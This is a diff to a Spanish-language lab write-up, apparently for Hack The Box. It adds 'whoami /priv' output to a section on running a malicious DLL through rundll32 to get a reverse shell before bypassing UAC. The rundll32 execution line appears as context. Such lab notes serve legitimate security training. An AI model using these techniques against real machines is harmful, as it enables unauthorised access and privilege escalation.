@@ -263,6 +263,23 @@ C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microso
 * **Sintaxis usada:** `rundll32 shell32.dll,Control_RunDLL <path a DLL>` invoca la función `Control_RunDLL` exportada por `shell32.dll` y pasa como argumento la DLL objetivo; en este contexto se fuerza la carga/ejecución de la DLL maliciosa.
 * **Resultado inicial:** Al ejecutar esto se obtiene una shell reversa con **privilegios normales** (UAC aún presente), por lo que la conexión inicial muestra credenciales de usuario no elevadas.
 
+```
+C:\Users\sarah> whoami /priv
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
 ---
 
 ## 16. Verificar/terminar procesos `rundll32` antes del exploit final
